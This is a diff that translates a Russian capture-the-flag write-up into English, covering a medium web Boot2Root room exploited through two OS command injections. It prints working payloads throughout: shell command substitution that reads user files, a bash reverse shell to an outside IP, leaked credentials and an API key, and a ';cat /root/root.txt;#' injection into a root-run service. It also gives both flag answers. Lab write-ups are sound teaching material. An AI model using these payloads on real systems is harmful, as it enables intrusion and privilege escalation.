@@ -1,9 +1,9 @@
-**Теги:** Web. Boot2Root.
-**Сложность:** Medium.
+**Tags:** Web, Boot2Root.
+**Difficulty:** Medium.
 
-## 1. Разведка
+## 1. Reconnaissance
 
-Цель комнаты — получить **user и root flag**, то есть полностью скомпрометировать систему.
+The goal of the room is to obtain the **user and root flags**, meaning to fully compromise the system.
 
 Target:
 
@@ -11,13 +11,13 @@ Target:
 10.112.179.167
 ```
 
-Начинаем со стандартного сканирования:
+We start with a standard scan:
 
 ```bash
 sudo nmap -sV -sC -O 10.112.179.167
 ```
 
-Получаем:
+We get:
 
 ```text
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-07 07:12 EDT
@@ -36,14 +36,14 @@ PORT   STATE SERVICE VERSION
 |_http-title: Byte Lotus — Stay Noticed
 ```
 
-Открыты:
+Open ports:
 
 ```text
 22/tcp — SSH
 80/tcp — HTTP (Gunicorn)
 ```
 
-Особенно интересен `robots.txt`, поскольку он раскрывает два запрещённых пути:
+The `robots.txt` file is particularly interesting because it reveals two disallowed paths:
 
 ```text
 /internal/
@@ -54,13 +54,13 @@ PORT   STATE SERVICE VERSION
 
 # 2. robots.txt
 
-Проверяем:
+We check:
 
 ```text
 http://10.112.179.167/robots.txt
 ```
 
-Содержимое:
+Contents:
 
 ```text
 User-agent: *
@@ -68,27 +68,27 @@ Disallow: /internal/
 Disallow: /status
 ```
 
-Переходим к `/status`:
+We navigate to `/status`:
 
 ```text
 http://10.112.179.167/status
 ```
 
-На странице обнаруживается форма **Staff tools → Sister-property connectivity**, которая позволяет указать host для проверки доступности удалённого объекта.
+The page contains a **Staff tools → Sister-property connectivity** form that allows us to specify a host to check the availability of a remote property.
 
-Это выглядит как потенциальная точка входа, поскольку сервер должен каким-то образом обработать введённое значение.
+This looks like a potential entry point, since the server must somehow process the supplied value.
 
 ---
 
-# 3. Проверка команды ping
+# 3. Testing the ping Command
 
-Сначала проверяем обычное значение:
+First, we test a normal value:
 
 ```text
 127.0.0.1
 ```
 
-Сервер возвращает результат:
+The server returns:
 
 ```text
 PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
@@ -99,61 +99,61 @@ PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
 rtt min/avg/max/mdev = 0.032/0.032/0.032/0.000 ms
 ```
 
-Следовательно, backend действительно выполняет системную команду `ping`.
+Therefore, the backend actually executes the system `ping` command.
 
 ---
 
-# 4. Обнаружение Command Injection
+# 4. Discovering Command Injection
 
-Проверяем, как приложение обрабатывает специальные символы.
+We check how the application handles special characters.
 
-Вводим:
+We enter:
 
 ```text
 '
 ```
 
-Получаем:
+We get:
 
 ```text
 /bin/sh: 1: Syntax error: Unterminated quoted string
 ```
 
-Это важный признак: введённое значение попадает непосредственно в shell-команду.
+This is an important sign: the supplied value is being passed directly into a shell command.
 
-Проверяем command substitution:
+We test command substitution:
 
 ```text
 host=$(id)
 ```
 
-Получаем:
+We get:
 
 ```text
 ping: groups=1001(web): Name or service not know
 ```
 
-Это подтверждает выполнение команды `id`.
+This confirms that the `id` command was executed.
 
-Таким образом, `/status` содержит **OS Command Injection**.
+Thus, `/status` contains **OS Command Injection**.
 
 ---
 
-# 5. Получение user flag
+# 5. Obtaining the User Flag
 
-После подтверждения command injection пробуем прочитать файл пользователя:
+After confirming command injection, we try to read the user's file:
 
 ```text
 host=$(cat /home/web/user.txt)
 ```
 
-Сервер возвращает:
+The server returns:
 
 ```text
 ping: THM{n0_v1s1bl3_3dg3}: Name or service not known
 ```
 
-Таким образом, первый флаг:
+Therefore, the first flag is:
 
 ```text
 THM{n0_v1s1bl3_3dg3}
@@ -161,27 +161,27 @@ THM{n0_v1s1bl3_3dg3}
 
 ---
 
-# 6. Получение reverse shell
+# 6. Obtaining a Reverse Shell
 
-Для полноценного доступа к системе используем command injection для запуска reverse shell:
+For full access to the system, we use command injection to launch a reverse shell:
 
 ```text
 $(bash -c 'bash -i >& /dev/tcp/192.168.154.82/4444 0>&1')
 ```
 
-После отправки payload получаем оболочку на машине:
+After sending the payload, we get a shell on the machine:
 
 ```text
 web@tryhackme-2404:/var/www/infinity_pool/edge$
 ```
 
-Проверяем содержимое текущей директории:
+We check the contents of the current directory:
 
 ```bash
 ls -la
 ```
 
-Получаем:
+We get:
 
 ```text
 total 32
@@ -195,7 +195,7 @@ drwxr-xr-x 5 root root 4096 Jun 30 09:06 venv
 -rw-r--r-- 1 root root   34 Jun 29 10:14 wsgi.py
 ```
 
-Текущий пользователь:
+Current user:
 
 ```text
 web
@@ -203,23 +203,23 @@ web
 
 ---
 
-# 7. Поиск пути к root
+# 7. Finding a Path to Root
 
-После получения shell запускаем LinPEAS для поиска возможностей повышения привилегий.
+After obtaining a shell, we run LinPEAS to search for privilege escalation opportunities.
 
-В результате обнаруживаем systemd-сервис:
+As a result, we discover a systemd service:
 
 ```text
 /etc/systemd/system/cc-automation.service
 ```
 
-Смотрим его содержимое:
+We inspect its contents:
 
 ```bash
 cat /etc/systemd/system/cc-automation.service
 ```
 
-Получаем:
+We get:
 
 ```text
 [Service]
@@ -233,16 +233,16 @@ ExecStart=/var/www/infinity_pool/automation/venv/bin/gunicorn \
     wsgi:app
 ```
 
-Ключевой момент:
+The key point is:
 
 ```text
 User=root
 Group=root
 ```
 
-Automation service работает от имени `root`.
+The automation service runs as `root`.
 
-При этом сервис слушает только localhost:
+At the same time, the service listens only on localhost:
 
 ```text
 127.0.0.1:9000
@@ -250,15 +250,15 @@ Automation service работает от имени `root`.
 
 ---
 
-# 8. Исследование automation API
+# 8. Investigating the Automation API
 
-Проверяем health endpoint:
+We check the health endpoint:
 
 ```bash
 curl -sS http://127.0.0.1:9000/health
 ```
 
-Получаем:
+We get:
 
 ```json
 {
@@ -278,31 +278,31 @@ curl -sS http://127.0.0.1:9000/health
 }
 ```
 
-Здесь обнаруживается интересный endpoint:
+We discover an interesting endpoint:
 
 ```text
 POST /jobs/export
 ```
 
-Для него требуется:
+It requires:
 
 ```text
 Authorization: Bearer <automation key>
 ```
 
-А сам сервис выполняется от `root`.
+And the service itself runs as `root`.
 
 ---
 
-# 9. Получение конфигурации
+# 9. Obtaining the Configuration
 
-Далее проверяем ещё один локальный API:
+Next, we check another local API:
 
 ```bash
 curl -sS http://127.0.0.1:3000/api/config
 ```
 
-Получаем:
+We get:
 
 ```json
 {
@@ -315,7 +315,7 @@ curl -sS http://127.0.0.1:3000/api/config
 }
 ```
 
-Таким образом, конфигурация раскрывает:
+Thus, the configuration reveals:
 
 ```text
 Automation endpoint:
@@ -333,28 +333,28 @@ St4yN0t1c3d_2026
 
 ---
 
-# 10. Telephony credentials
+# 10. Telephony Credentials
 
-Из конфигурации получаем:
+From the configuration, we obtain:
 
 ```text
 Username: FreePBXUCPTemplateCreator
 Password: St4yN0t1c3d_2026
 ```
 
- Отметим также:
+We also note:
 
 ```text
 FreePBX CVE-2026-46376
 ```
 
-Для доступа к внутреннему telephony portal использовался SSH-туннель:
+An SSH tunnel was used to access the internal telephony portal:
 
 ```bash
 ssh -o IdentitiesOnly=yes -i infinity -L 8080:127.0.0.1:8080 web@10.113.184.19
 ```
 
-Также находим automation key:
+We also find the automation key:
 
 ```text
 Automation Key: cc_auto_7b3f9a1c4e0d2f6a
@@ -362,9 +362,9 @@ Automation Key: cc_auto_7b3f9a1c4e0d2f6a
 
 ---
 
-# 11. Command Injection в `/jobs/export`
+# 11. Command Injection in `/jobs/export`
 
-Теперь у нас есть всё необходимое для обращения к внутреннему automation API:
+Now we have everything necessary to access the internal automation API:
 
 ```text
 Endpoint:
@@ -374,7 +374,7 @@ Authorization:
 Bearer cc_auto_7b3f9a1c4e0d2f6a
 ```
 
-Сначала проверяем параметр `report` командой `id`:
+First, we test the `report` parameter with the `id` command:
 
 ```bash
 curl -sS \
@@ -385,21 +385,21 @@ curl -sS \
     --data-binary '{"report":"test;id;#"}'
 ```
 
-Используем:
+We use:
 
 ```text
 test;id;#
 ```
 
-как значение `report`, чтобы проверить возможность внедрения команды.
+as the `report` value to test for command injection.
 
-Поскольку automation service работает от имени `root`, успешное выполнение `id` должно показать root-контекст.
+Since the automation service runs as `root`, successful execution of `id` should show the root context.
 
 ---
 
-# 12. Получение root flag
+# 12. Obtaining the Root Flag
 
-После подтверждения command injection используем тот же endpoint для чтения root flag:
+After confirming command injection, we use the same endpoint to read the root flag:
 
 ```bash
 curl -sS \
@@ -410,21 +410,21 @@ curl -sS \
     --data-binary '{"report":"x;cat /root/root.txt;#"}'
 ```
 
-Payload:
+The payload:
 
 ```text
 x;cat /root/root.txt;#
 ```
 
-позволяет выполнить:
+allows us to execute:
 
 ```bash
 cat /root/root.txt
 ```
 
-в контексте root-сервиса.
+in the context of the root service.
 
-Получаем root flag:
+We get the root flag:
 
 ```text
 THM{tr4c3d_t0_th3_h0r1z0n}
@@ -432,7 +432,7 @@ THM{tr4c3d_t0_th3_h0r1z0n}
 
 ---
 
-# Итоговая цепочка
+# Final Chain
 
 ```text
 Nmap
@@ -505,28 +505,28 @@ THM{n0_v1s1bl3_3dg3}
 THM{tr4c3d_t0_th3_h0r1z0n}
 ```
 
-## Уязвимости
+## Vulnerabilities
 
-Основная цепочка эксплуатации состоит из двух command injection.
+The main exploitation chain consists of two command injections.
 
-Первая находится в `/status`: введённый `host` попадает в shell-команду `ping`, что позволяет выполнять произвольные команды от имени пользователя `web`.
+The first is located in `/status`: the supplied `host` value is passed into a shell command that runs `ping`, allowing arbitrary commands to be executed as the `web` user.
 
-Вторая находится во внутреннем automation API `/jobs/export`. Сервис запущен с:
+The second is located in the internal automation API `/jobs/export`. The service runs with:
 
 ```text
 User=root
 Group=root
 ```
 
-а параметр `report` позволяет внедрить команды. Благодаря этому выполнение:
+and the `report` parameter allows command injection. As a result, executing:
 
 ```text
 cat /root/root.txt
 ```
 
-происходит с root-привилегиями.
+runs with root privileges.
 
-Таким образом, цепочка выглядит как:
+Thus, the chain is:
 
 ```text
 Command Injection → web shell → enumeration → root service → Command Injection → root flag
